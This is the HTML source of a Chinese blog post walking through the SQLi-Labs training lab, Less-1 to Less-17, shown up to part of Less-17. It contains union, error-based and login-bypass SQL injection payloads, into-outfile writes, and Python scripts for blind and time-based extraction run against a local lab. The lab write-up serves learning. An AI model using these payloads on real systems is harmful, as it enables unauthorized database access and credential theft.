@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="一天5个叭。。。尽量一天5个叭。。。2020-1-13Less-11-1题目说明 Please input the ID as parameter with numeric value，所以使用id来注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-Labs">
+<meta property="og:url" content="http:&#x2F;&#x2F;no-timing&#x2F;no-timing.github.io&#x2F;2020&#x2F;01&#x2F;12&#x2F;SQLi-Labs&#x2F;index.html">
+<meta property="og:site_name" content="no-timing">
+<meta property="og:description" content="一天5个叭。。。尽量一天5个叭。。。2020-1-13Less-11-1题目说明 Please input the ID as parameter with numeric value，所以使用id来注入">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-01-18T10:52:08.689Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://no-timing/no-timing.github.io/2020/01/12/SQLi-Labs/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>SQLi-Labs | no-timing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">no-timing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/no-timing" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://no-timing/no-timing.github.io/2020/01/12/SQLi-Labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ame.jpg">
+      <meta itemprop="name" content="yzz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="no-timing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQLi-Labs
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-12 17:07:31" itemprop="dateCreated datePublished" datetime="2020-01-12T17:07:31+08:00">2020-01-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-01-18 18:52:08" itemprop="dateModified" datetime="2020-01-18T18:52:08+08:00">2020-01-18</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>一天5个叭。。。</p><p>尽量一天5个叭。。。</p><p><strong>2020-1-13</strong></p><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p>1-1</p><p>题目说明 <code>Please input the ID as parameter with numeric value</code>，所以使用<code>id</code>来注入</p><a id="more"></a>
+
+
+
+
+<p><code>?id=1&#39;</code>报错<code>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39;  at line 1</code> </p>
+<p>1-2</p>
+<p>使用order by查列数，<code>?id=1&#39; order by 4 %23&#39;</code>报错，存在三列 </p>
+<p>1-3</p>
+<p>接着进行联合注入，通过回显爆出表名，列名，字段。</p>
+<p><em>这里查询时需要将id查询结果限定为空集，第二个查询结果才能显示出来</em></p>
+<p>查询数据库 <code>?id=-1&#39; union select 1,group_concat(schema_name),concat_ws(&#39;;&#39;,schema_name) from information_schema.schemata--+</code> </p>
+<p>1-4</p>
+<p>查询security数据库的表 <code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> </p>
+<p>1-5</p>
+<p>查询user表的列 <code>?id=-1&#39; union select 1,group_concat(column_name),3 from  information_schema.columns where table_name=&#39;users&#39;--+</code> </p>
+<p>1-6</p>
+<p>查询数据 <code>?id=-1&#39; union select 1,concat_ws(&#39;;&#39;,username,password),3 from users where id=1--+</code> </p>
+<p>1-7</p>
+<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>2-1</p>
+<p>查询<code>?id=1</code>，正常</p>
+<p>查询<code>?id=1&#39;</code>，报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>2-2</p>
+<p>可知单引号影响了闭合，该注入为整数型，只需在Less-1的基础上，将每个payload中的<code>&#39;</code>删除即可</p>
+<p>最终payload为<code>?id=-1 union select 1,concat_ws(&#39;;&#39;,username,password),3 from users where id=1--+</code></p>
+<p>2-3</p>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>查询<code>?id=1</code>，正常</p>
+<p>查询<code>?id=1&#39;</code>，报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>
+<p>可知该处使用<code>&#39;)</code>进行闭合，其余步骤与上相同</p>
+<p>最终payload为<code>?id=-1&#39;) union select 1,concat_ws(&#39;;&#39;,username,password),3 from users where id=1--+</code></p>
+<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>查询<code>?id=1</code>，正常</p>
+<p>查询<code>?id=1’</code>，正常</p>
+<p>查询<code>?id=1&quot;</code>，报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></p>
+<p>可知该处使用<code>&quot;)</code>进行闭合，其余步骤与上相同</p>
+<p>最终payload为<code>?id=-1&quot;) union select 1,concat_ws(&#39;;&#39;,username,password),3 from users where id=1--+</code></p>
+<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>查询<code>?id=1</code>，显示<code>You are in...........</code>，判断需要盲注</p>
+<p>查询<code>?id=1&#39;</code>，报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>可以构造payload进行基于bool的盲注，使用脚本进行</p>
+<p>此处以查询数据库名为例，其他的类似，只需改url中的payload即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"><span class="comment">#url = "http://127.0.0.1/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"><span class="comment">#table_name = ''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">		payload = url.format(_ = i,__ = j)</span><br><span class="line">		<span class="comment">#print payload</span></span><br><span class="line">		ans  = requests.get(payload)</span><br><span class="line">		<span class="comment">#print ans.content</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">			database = database + chr(j)</span><br><span class="line">			<span class="keyword">print</span> database</span><br><span class="line">			<span class="comment">#table_name += chr(j)</span></span><br><span class="line">			<span class="comment">#print table_name</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>执行结果为security</p>
+<p>5-2</p>
+<p>也可以报错注入，payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">' and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>查询<code>?id=1</code>，显示You are in………..</p>
+<p>查询<code>?id=1’</code>，显示You are in………..</p>
+<p>查询<code>?id=1&quot;</code>，报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; LIMIT 0,1&#39; at line 1</code></p>
+<p>可知该处使用<code>&quot;</code>进行闭合，同样使用bool盲注，注入的脚本只需将Less-5中payload中的’改为”即可，其余步骤与Less-5一样</p>
+<p><strong>2020-1-14</strong></p>
+<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>查询<code>?id=1</code>，显示<code>You are in.... Use outfile......</code></p>
+<p>查询<code>?id=1 and 1=2</code>，显示<code>You are in.... Use outfile......</code>，说明不是数值型注入</p>
+<p>查询<code>?id=1&#39;</code>，报错<code>You have an error in your SQL syntax</code></p>
+<p>查询<code>?id=1&#39; --+</code>，报错<code>You have an error in your SQL syntax</code></p>
+<p>查询<code>?id=1&#39;) --+</code>，报错<code>You have an error in your SQL syntax</code></p>
+<p>查询<code>?id=1&#39;)) --+</code>，显示<code>You are in.... Use outfile......</code>，判断参数提交为((‘$id’)) </p>
+<p>题目又说需要 <code>use outfile</code> </p>
+<p><em>这里我对linux的导出文件不是很熟练，所以换成了win10里用phpstudy搭的sqli-labs环境测试</em></p>
+<p>判断读写权限 <code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> ，没有报错，说明具有root权限</p>
+<p>导出表 <code>?id=-1&#39;)) union select 1,2,(select group_concat(table_name) from  information_schema.tables where table_schema=database()) into outfile  &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\table.php&quot;--+</code> </p>
+<p>导出user表中列名 <code>?id=-1&#39;)) union select 1,2,(select group_concat(column_name) from  information_schema.columns where table_name=&#39;users&#39;) into outfile  &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\column.php&quot;--+</code> </p>
+<p>导出用户名和密码 <code>?id=-1&#39;)) union select 1,2,(select group_concat(username,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\data.php&quot;--+</code> </p>
+<h4 id="Less-8-盲注单引号注入"><a href="#Less-8-盲注单引号注入" class="headerlink" title="Less-8-盲注单引号注入"></a>Less-8-盲注单引号注入</h4><p>查询<code>?id=1</code>，显示<code>You are in...........</code></p>
+<p>查询<code>?id=1&#39;</code>，没有回显</p>
+<p>查询<code>?id=&#39; or 1=1--+</code>，显示<code>You are in...........</code>，说明为单引号闭合</p>
+<p>直接使用脚本进行基于bool的盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/Less-8/?id=1' and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">    	mid = (max+min)//<span class="number">2</span></span><br><span class="line">    	payload = url.format(_=i,__=mid)</span><br><span class="line">    	ans = requests.get(payload)</span><br><span class="line">    	<span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">    		min = mid</span><br><span class="line">    	<span class="keyword">else</span>:</span><br><span class="line">    		max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-9-基于时间的GET单引号盲注"><a href="#Less-9-基于时间的GET单引号盲注" class="headerlink" title="Less-9-基于时间的GET单引号盲注"></a>Less-9-基于时间的GET单引号盲注</h4><p>无论查询什么，页面均显示 <code>You are in...........</code> </p>
+<p>测试<code>?id=1&#39; and sleep(2)--+</code>，发现页面会延时2s回显，说明为基于时间的盲注</p>
+<p>使用脚本进行基于时间的盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/Less-8/?id=1'and if(ascii(substr(database(),&#123;_&#125;,1))=&#123;__&#125;,1,sleep(2))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-10-基于时间的GET双引号盲注"><a href="#Less-10-基于时间的GET双引号盲注" class="headerlink" title="Less-10-基于时间的GET双引号盲注"></a>Less-10-基于时间的GET双引号盲注</h4><p>与less-9一样也是基于时间的盲注，不同的是less-9是单引号闭合，此题为双引号闭合</p>
+<h4 id="Less-11-基于错误的post单引号注入"><a href="#Less-11-基于错误的post单引号注入" class="headerlink" title="Less-11-基于错误的post单引号注入"></a>Less-11-基于错误的post单引号注入</h4><p>11-1</p>
+<p>此题是一个登录框，先试试万能密码</p>
+<p>即Username输入<code>1&#39; or 1=1#</code>，Password为任意值。</p>
+<p>登陆成功</p>
+<p>11-2</p>
+<p><strong>思考点</strong></p>
+<p>查看源代码，后端的登陆语句为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">	$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">	$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">	fwrite($fp,<span class="string">'User Name:'</span>.$uname);</span><br><span class="line">	fwrite($fp,<span class="string">'Password:'</span>.$passwd.<span class="string">"\n"</span>);</span><br><span class="line">	fclose($fp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// connectivity </span></span><br><span class="line">	@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用的是<font color="red">POST请求</font>，只能使用<code>#</code>进行注释</p>
+<h4 id="Less-12-基于错误的post双引号注入"><a href="#Less-12-基于错误的post双引号注入" class="headerlink" title="Less-12-基于错误的post双引号注入"></a>Less-12-基于错误的post双引号注入</h4><p>构造Username输入<code>1&#39; or 1=1#</code>，Password为任意值，登陆失败。</p>
+<p>构造Username输入<code>1&quot; or 1=1#</code>，Password为任意值，报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; at line 1</code></p>
+<p>构造Username输入<code>1&quot;) or 1=1#</code>，Password为任意值，登陆成功</p>
+<p>此题闭合方式为 <code>(&quot;$uname&quot;)</code> </p>
+<h4 id="Less-13-POST单引号变形双注入"><a href="#Less-13-POST单引号变形双注入" class="headerlink" title="Less-13-POST单引号变形双注入"></a>Less-13-POST单引号变形双注入</h4><p>构造Username输入<code>1&#39; or 1=1#</code>，Password为任意值，报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; at line 1</code></p>
+<p>构造Username输入<code>1&#39;) or 1=1#</code>，Password为任意值，登陆成功</p>
+<p>此题闭合方式为 <code>(&#39;$uname&#39;)</code> </p>
+<h4 id="Less-14-POST双引号变形双注入"><a href="#Less-14-POST双引号变形双注入" class="headerlink" title="Less-14-POST双引号变形双注入"></a>Less-14-POST双引号变形双注入</h4><p>构造Username输入<code>1&quot; or 1=1#</code>，Password为任意值，登陆成功</p>
+<p>此题闭合方式为 <code>(&#39;$uname&#39;)</code> </p>
+<p><strong>2020-1-15</strong></p>
+<h4 id="Less-15-基于bool型-时间延迟单引号POST型盲注"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注" class="headerlink" title="Less-15-基于bool型/时间延迟单引号POST型盲注"></a>Less-15-基于bool型/时间延迟单引号POST型盲注</h4><p>构造Username输入<code>1&#39; or 1=1#</code>，Password为任意值，登陆成功</p>
+<p>此题闭合方式为<code>&#39;$uname&#39;</code> </p>
+<h4 id="Less-16-基于bool型-时间延迟的双引号POST型盲注"><a href="#Less-16-基于bool型-时间延迟的双引号POST型盲注" class="headerlink" title="Less-16-基于bool型/时间延迟的双引号POST型盲注"></a>Less-16-基于bool型/时间延迟的双引号POST型盲注</h4><p>构造Username输入<code>1&quot; or 1=1#</code>，Password为任意值，登陆失败</p>
+<p>再构造Username输入<code>1&quot;) or 1=1#</code>，Password为任意值，登陆成功</p>
+<p>此题闭合方式为<code>(&quot;$uname&quot;)</code> </p>
+<h4 id="Less-17-基于错误的更新查询POST注入"><a href="#Less-17-基于错误的更新查询POST注入" class="headerlink" title="Less-17-基于错误的更新查询POST注入"></a>Less-17-基于错误的更新查询POST注入</h4><p>17-1</p>
+<p>构造Username输入<code>1&#39; or 1=1#</code>，Password为任意值，登陆失败</p>
+<p>17-2</p>
+<p>先看看后端源代码再尝试注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br></pre></td></tr></table></figure>
+
+<p>这里使用<code>check_input</code>函数对uname的输入进行过滤，而passwd并没有过滤，又页面提示为PASSWORD RESET，为重置密码界面，所以从密码框尝试注入 </p>
+<p>能够利用的查询语句为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>所以，可以使用报错注入用单引号闭合password</p>
+<p>爆数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>17-3</p>
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>17-4</p>
+<p>爆列</p>
